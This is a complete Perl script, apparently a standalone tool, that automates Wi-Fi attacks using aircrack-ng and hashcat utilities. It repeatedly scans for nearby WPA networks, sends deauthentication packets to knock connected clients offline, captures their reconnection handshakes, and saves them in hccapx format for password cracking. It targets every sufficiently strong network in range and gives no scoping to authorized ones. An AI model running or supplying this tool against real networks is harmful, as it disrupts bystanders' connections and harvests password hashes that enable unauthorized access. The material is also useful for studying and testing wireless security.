#!/usr/bin/perl 
# Wifi Hash Capture using aircrack-ng and friends
#
# ------------------------------------------------------------------------------
# constant definitions
# ------------------------------------------------------------------------------
use Getopt::Std;
use File::Temp;
use File::Copy;
use POSIX;
use Term::ReadKey;
ReadMode 3;

$SIG{INT}  = sub { mydie("Aborted with Ctrl-C\n"); };

$ft = File::Temp->new (
    UNLINK   => 1,
    TEMPLATE => '/tmp/hash-capture-XXXX',
); 
    
$basescanfile=$ft->filename . "-";
$seqscan=0;

$BSSID=0;
$FirstTimeSeen=1;
$LastTimeSeen=2;
$Channel=3;
$Speed=4;
$Privacy=5;
$Cipher=6;
$Authentication=7;
$Power=8;
$Nbeacons=9;
$NIV=10;
$LANIP=11;
$IDlength=12;
$ESSID=13;
$Key=14;

$StationMAC=0;
$StaFirstTimeSeen=1;
$StaLastTimeSeen=2;
$StaPower=3;
$StaNpackets=4;
$StaBSSID=5;
$StaProbedESSIDs=6;

sub myexit {
    ReadMode 0;
    exit $_[0];
}

sub mydie {
    ReadMode 0;
    die $_[0];
}

# ----- mysystem, a better system
sub mysystem {
    my $pid;
    $pid = fork;
    unless ($pid) {
	exec (@_);
    }
    while (waitpid($pid, WNOHANG) != $pid ) {
	print STDERR "///// waiting for process $pid to end \n" if ($verbose);
	check_keypress();
	sleep 1;
    }
}

#----- processOpts - process options and set default values
sub processOpts {
    
    getopts('s:c:n:m:d:xvhi:bo:');

    if ( $opt_o && (($opt_o eq 'std') || ($opt_o eq 'fast'))) {
	$opmode = $opt_o;
    } else {
	$opmode = 'std';
    }

    $nextOpmode = $opmode;
    
    if ($opmode eq 'fast') {
	$defaultScanTime    = 5;
	$defaultCaptureTime = 5;
    } else {
	$defaultScanTime    = 10;
	$defaultCaptureTime = 10;
    }
    
    $scanTime=      $opt_s ||  $defaultScanTime;
    $captureTime=   $opt_c ||  $defaultCaptureTime;
    $minPower=      $opt_m || -90;
    $ndeauth=       $opt_n ||   5;
    $notRemove=     $opt_x ||   0;
    $datadir=       $opt_d || '/usr/share/hash-capture';
    $handshakesdir= "$datadir/handshakes";
    $foundfile=     "$datadir/found.txt";
    $verbose=       $opt_v || 0;
    $bigfont=       $opt_b || 0;
    $iface=         $opt_i;

	 
    if ($minPower > 0) {$minPower=-$minPower;};
    if (mysystem("iw dev $iface info > /dev/null 2>&1")) {
	mydie("!!!!! ERROR $iface doesn't exists\n");
    }
    if ($opt_h) { usage(); }

    unless ($opt_i) {
	print STDERR "!!!!! MISSING interface (-i option)\n";
	usage();
    }
    

    if ($verbose) {
	print STDERR "///// scanTime:      $scanTime\n";
	print STDERR "///// captureTime:   $captureTime\n";
	print STDERR "///// ndeauth:       $ndeauth\n";
	print STDERR "///// minPower:      $minPower\n";
	print STDERR "///// interface:     $iface\n";
	print STDERR "///// datadir:       $datadir\n";
	print STDERR "///// handshakesdir: $handshakesdir\n";
	print STDERR "///// foundifle:     $foundfile\n";
	print STDERR "///// bigfont:       $bigfont\n";
	print STDERR "///// opmode:        $opmode\n";
    }
    # ----- initialize some global variables
    $status=" ";
    $subject=" ";
    $nfound=0;
    $seqscan=0;
    $seqdeau=0;
}

#----- usage
sub usage {
    check_requirements ();
    print "usage: hash-capture.pl [ options ] -i interface \n";
    print " Arguments\n";
    print "   -s scanTime      time to scan for wifi access points\n";
    print "   -c captureTime   time to capture packets after de-auth\n";
    print "   -n ndeauth       number of de-authentication packets to send\n";
    print "   -m minPower      minimum station and AP power to send de-auth\n";
    print "   -d handshakeDir  directory where to store handshakes, default /usr/share/hash-capture\n";
    print "   -x               dont remove temporary files\n";
    print "   -v               verbose \n";
    print "   -h               print this help\n";
    print "   -i interface     monitoring interface name\n";
    print "   -b               select very big font on display\n";
    print "   -o std|fast      select operation mode, default std\n";
    print "                    fast mode scan a single channel at a time\n";
    print " Example: \n";
    print "   hash-capture.pl -s 10 -c 10 -m -90 -v -i mon0\n";
    myexit;
}

#----- screen clear
sub scr_clear {
    print "\033[2J";    #clear the screen
    print "\033[0;0H";  #jump to 0,0
}

#----- check_requirements - check needed programs and directories
sub check_requirements {
    my %reqpkg;
    my $reqpkgok;
    my $k;
    
    # check required executables
    $reqpkg{'iw'}='iw';
    $reqpkg{'airodump-ng'}='aircrack-ng';
    $reqpkg{'cap2hccapx'}='https://github.com/hashcat/hashcat-utils';
    $reqpkg{'iwconfig'}='wireless-tools';
    $reqpkg{'aireplay-ng'}='aircrack-ng';
    if ($bigfont) {
	$reqpkg{'figlet'}='figlet';
    }
    $reqpkgok=1;
    for $k (sort keys %reqpkg) {
	if (system "which $k > /dev/null 2>&1") {
	    print STDERR "!!!!! ERROR $k missing (usually provided by package $reqpkg{$k})\n";
	    $reqpkgok=0;
	} else {
	    print STDERR "///// $k available\n" if ($verbose);
	}
    }
    if ($reqpkgok == 0) {
	print STDERR "!!!!! ERROR missing required packageg\n";
	myexit(1);
    }

    # ----- checking datadir etc
    if (-d $datadir) {
	print "///// $datadir exists\n" if ($verbose);
    } else {
	print STDERR "----- creating $datadir\n";
	mkdir $datadir || mydie("!!!!! ERROR creating $datadir\n");
	print STDERR "///// $datadir created\n" if ($verbose);
    }
    if (-d $handshakesdir) {
	print "///// $handshakesdir exists\n" if ($verbose);
    } else {
	mkdir $handshakesdir || mydie("!!!!! ERROR creating $handshakesdir\n");
	print STDERR "///// $handshakesdir created\n" if ($verbose);
    }
    if (-f $foundfile) {
	print "///// $foundfile exists\n" if ($verbose);
    } else {
	open(F,"> $foundfile") || mydie("!!!!! ERROR writing to $foundfile\n");
	print F "# AP-MAC          \tSTA-MAC          \tAP-PWR \tSTA-PWR \tDATE \tSSID\n";
	close(F);
    }
}

#----- load_found - load SSID of handshake already captured or to be ignored
sub load_found {
    my @l;
    open (F, "$foundfile") || mydie("!!!!! ERROR reading from $foundfile\n");
    while (<F>) {
	chomp;
	next if (/^\#/);
	next if (/^\s*$/);
	@l=split /\s*\t\s*/;
	$apignore{$l[0]}=1;
	print STDERR "///// ignoring ap found: $l[0]\n" if ($verbose);
    }
}

#----- ap_bypower - sort ap (access points) by power
sub ap_bypower {
    my $A = $ap{$a}[$Power];
    my $B = $ap{$b}[$Power];
    return $A <=> $B;
}

#----- sta_bypower - sort sta (stations) by power
sub sta_bypower {
    my $A = $sta{$a}[$StaPower];
    my $B = $sta{$b}[$StaPower];
    return $A <=> $B;
}

#----- print ap (hash of array)
sub print_ap {
    my $k;
    for $k (reverse sort ap_bypower keys %ap) {
	printf STDERR "///// AP   %-17s  %-30s  ch: %3d, pwr: %3d\n",
	    $k,
	    $ap{$k}[$ESSID],
	    $ap{$k}[$Channel],
	    $ap{$k}[$Power];

    }
}

#----- print sta (hash of array)
sub print_sta {
    my $k;
    for $k (reverse sort sta_bypower keys %sta) {
	printf STDERR "///// STA  %-17s  %-17s  %-30s pwr: %3d\n",
	    $k,
	    $sta{$k}[$StaBSSID],
	    $ap{$sta{$k}[$StaBSSID]}[$ESSID],
	    $sta{$k}[$StaPower];
    }
}

# ----- give a random channel from 1 to 11, used in fastmode
# ----- channels 1, 6, 11 have much higher probability
sub getrandomchannel {
    my $r,$c;
    $r=int(rand(210));
    if ($r < 40) {
	$c=1;
    } elsif ($r < 70) {
	$c=6;
    } elsif ($r < 100) {
	$c=11;
    } else {
	$c = int(( $r - 100.0 ) / 10.0) + 1;
    }
    return $c;
}

# ----- scan_ap - scanning access points
sub scan_ap {
    my $sseq;
    my $rchan;
    $seqscan++;
    $seqdeau=0;
    $status="Scanning";
    $subject=" ";
    $sseq=sprintf "%04d",$seqscan;
    $scanfile=$basescanfile . $sseq;
    if ($verbose) {
	print STDERR "///// scanfile: $scanfile\n";
    }
    if ($opmode eq 'fast') {
	$rchan=getrandomchannel();
	$status .= "  $rchan";
	$scanchannel=" -c $rchan ";
	print STDERR "///// scanchannel: $scanchannel\n" if ($verbose);
    } else {
	$scanchannel="";
    }
    display_status();
    mysystem ("timeout --foreground $scanTime airodump-ng $iface " . 
	    "-t wpa -w $scanfile $scanchannel --output-format csv " .
	    "> /dev/null 2>&1 < /dev/null ");
    if ($verbose) {
	print STDERR "///// end of scan\n";
    }
}

# ------------------------------------------------------------------------------
# load_ap_sta
# parameters:
#    fn: file name
# load into hash of arrays ap (access points) and sta (stations), 
# aps index is bssid (mac address), fields are:
    # 0 BSSID
    # 1 First time seen
    # 2 Last time seen
    # 3 channel
    # 4 Speed
    # 5 Privacy
    # 6 Cipher
    # 7 Authentication
    # 8 Power
    # 9 # beacons
    # 10 # IV
    # 11 LAN IP
    # 12 ID-length
    # 13 ESSID
    # 14 Key

sub load_ap_sta {
    my $fn=$_[0];
    my $status=0; # 0 initial state 1 reading stations 2 reading clients
    undef %ap;
    undef %sta;
    open(F,$fn) || mydie("error opening $fn\n");
    while (<F>) {
	if (/^BSSID/) {
	    $status=1;
	    next;
	}
	if (/^Station/) {
	    $status=2;
	    next;
	}
	unless (/\,/) {next;}
	if ($status == 1) {
	    chomp;
	    undef @l;
	    @l=split /\s*,\s*/;
	    if ($l[$ESSID]) {
		$ap{$l[0]}=[ @l ];
	    } else {
		next;
	    }
	} elsif ($status == 2) {
	    chomp;
	    if ($_=~/^\s*$/) {next;}
	    undef @l;
	    @l=split /\s*,\s*/;
	    if (($l[$StaBSSID]=~/..:..:..:..:..:../) && ($ap{$l[$StaBSSID]}[$channel])) {
		$sta{$l[0]}=[ @l ];
	    } else {
		next;
	    }
	}
    }
}

# ----- deauth_sta - de-authenticate stations and capture handshake
sub deauth_sta {
    my $k;
    my $cmd;
    for $k (reverse sort sta_bypower keys %sta) {
	$appwr=$ap{$sta{$k}[$StaBSSID]}[$Power];
	$stapwr=$sta{$k}[$StaPower];
	$apmac=$sta{$k}[$StaBSSID];
	$stamac=$sta{$k}[$StationMAC];
	$apssid=$ap{$sta{$k}[$StaBSSID]}[$ESSID];
	$apchan=$ap{$sta{$k}[$StaBSSID]}[$Channel];
	if (($stapwr  >= $minPower) &&
	    ($appwr   >= $minPower) &&
	    (! $apignore{$apmac} )) {
	    
	    $seqdeau++;
	    $capfile=$scanfile ."-" . $apmac ."-" . $stamac;
	    $capfile=~s/\://g;
	    $status="Deauth";
	    $subject="$apssid";
	    display_status();
	    # ----- select channel on monitor interface
	    $cmd="iwconfig $iface channel $apchan";
	    if ($verbose) {
		print STDERR "///// deauth $k - $ap{$sta{$k}[$StaBSSID]}[$ESSID]\n";
		print STDERR "/////   apmac: $apmac, stamac: $stamac, ssid: $apssid, chan: $apchan\n";
		print STDERR "///// capfile: $capfile\n";
		print STDERR "///// executing: $cmd\n";
	    }
	    mysystem("$cmd");

	    # ----- send deauth packet
	    $cmd="aireplay-ng --deauth $ndeauth -a $apmac -c $stamac $iface >/dev/null 2>&1 < /dev/null &";
	    print STDERR "///// deauthenticating: $cmd \n" if ($verbose);
	    mysystem("$cmd");

	    $status="Listening";
	    display_status();

	    # ----- capture packets
	    $cmd =  "timeout --foreground $captureTime airodump-ng " .
		"-w $capfile --output-format pcap --bssid $apmac --channel $apchan $iface " .
		" > /dev/null 2>&1 < /dev/null";
	    print STDERR "///// sniffing: $cmd\n" if ($verbose);
	    mysystem($cmd);

	    # ----- convert captured packets from cap to hccapx
	    print STDERR "///// converting to hccapx\n" if ($verbose);
	    mysystem("cap2hccapx $capfile-01.cap $capfile-01.hccapx > /dev/null 2>&1");

	    # ----- check if the captured packets contain handshake
	    $hashflag=`wlanhcxinfo -i $capfile-01.hccapx 2>&1`;
	    print STDERR "///// hashflag: $hashflag\n" if ($verbose);
	    if ($hashflag =~ /0 records loaded/) {
		print STDERR "///// no captured handshake\n" if ($verbose);
		do_cleanup();
	    } else {
		print STDERR "----- handshake FOUND!\n";
		$nfound++;
		display_status();
		do_found();
	    }
	} else {
	    if ($verbose) {
		print STDERR "///// NOT deauth $k - $ap{$sta{$k}[$StaBSSID]}[$ESSID]\n";
		print STDERR "/////   apmac: $apmac, stamac: $stamac, ssid: $apssid\n";
	    }
	}
	if (($opmode eq 'fast') && ($seqdeau >= 3)) {
	    print STDERR "///// break deauth loop after $seqdeau cycles, we are in fast mode\n" if ($verbose);
	    last;
	}
    }
}

# ----- remove temporary files
sub do_cleanup {
    if ($notRemove) {
	print STDERR "///// NOT removing $scanfile-01.csv $capfile-01.cap $capfile-01.hccapx\n" if ($verbose)
    } else {
	print STDERR "///// removing $scanfile-01.csv $capfile-01.cap $capfile-01.hccapx\n" if ($verbose);
	unlink "$scanfile-01.csv", "$capfile-01.cap", "$capfile-01.hccapx";
    }
}

# ----- handshake was found, save captured packets and update db
sub do_found {
    copy("$capfile-01.hccapx","$handshakesdir/$apmac.hccapx") ||
	mydie("!!!!! Error copying to $handshakesdir/$apmac.hccapx\n");
    $currdate=strftime "%Y%m%d-%H%M%S", localtime time;
    open(F,">> $foundfile") || mydie("!!!!! ERROR writing to $foundfile\n");
    #print F "# AP-MAC \tSTA-MAC \tAP-PWR \tSTA-PWR \tDATE \tSSID\n";
    print F "$apmac\t$stamac\t$appwr\t$stapwr\t$currdate\t$apssid\n";
    close(F);
    $apignore{$apmac}=1;
}

# ----- display_status - display current status
#   global variables:
#      $status      Scanning|Deauth|Listening
#      $subject     current SSID
#      $nfound      number of handshakes found so far
#      $seqscan     scan sequence
#      $seqdeau        deauth sequence

sub display_status {
    if ($bigfont && (! $verbose)) {
	scr_clear();
    }
    print "Mode:       $opmode\n";
    if ($bigfont) {
	system("figlet -t -k \'$status\'");
	system("figlet -t -k \'$subject\'");
	system("figlet -t -k \'$nfound new - run $seqscan.$seqdeau\'");
    } else {
	print "Status:     $status\n";
	print "Subject:    $subject\n";
	print "Found:      $nfound\n";
	print "Sequence:   $seqscan - $seqdeau\n";
	print "\n";
    }
}

sub check_keypress {
    my $key;
    
    if (defined ($key = ReadKey(-1))) {
	print "----- pressed: $key\n" if ($verbose);
	if ($key eq "q" || $key eq "Q") {
	    print "----- pressed $key, exiting\n";
	    myexit;
	} elsif ($key eq "f" || $key eq "F") {
	    print "///// switching to fast mode on next run\n";
	    $nextOpmode = 'fast';
	} elsif ($key eq "s" || $key eq "S") {
	    print "///// switching to std mode on next run\n";
	    $nextOpmode = 'std';
	} else {
	    print "----- $key unamanged\n";
	    print "----- press Q to exit\n";
	    sleep 2;
	}
    }
}

# -----------------------------------------------------------------------------
# Main Program
# -----------------------------------------------------------------------------

processOpts();
check_requirements();
load_found();

#----- main loop
while (1) {
    if ($opmode ne $nextOpmode) {
	$opmode = $nextOpmode;
	if ($opmode eq 'fast') {
	    $scanTime    =5;
	    $captureTime =5;
	}
	if ($opmode eq 'std') {
	    $scanTime    =10;
	    $captureTime =10;
	}
    }
    scan_ap();
    check_keypress();
    load_ap_sta("$scanfile-01.csv");
    print_ap()    if ($verbose);
    print_sta()   if ($verbose);
    deauth_sta();
    check_keypress();
}
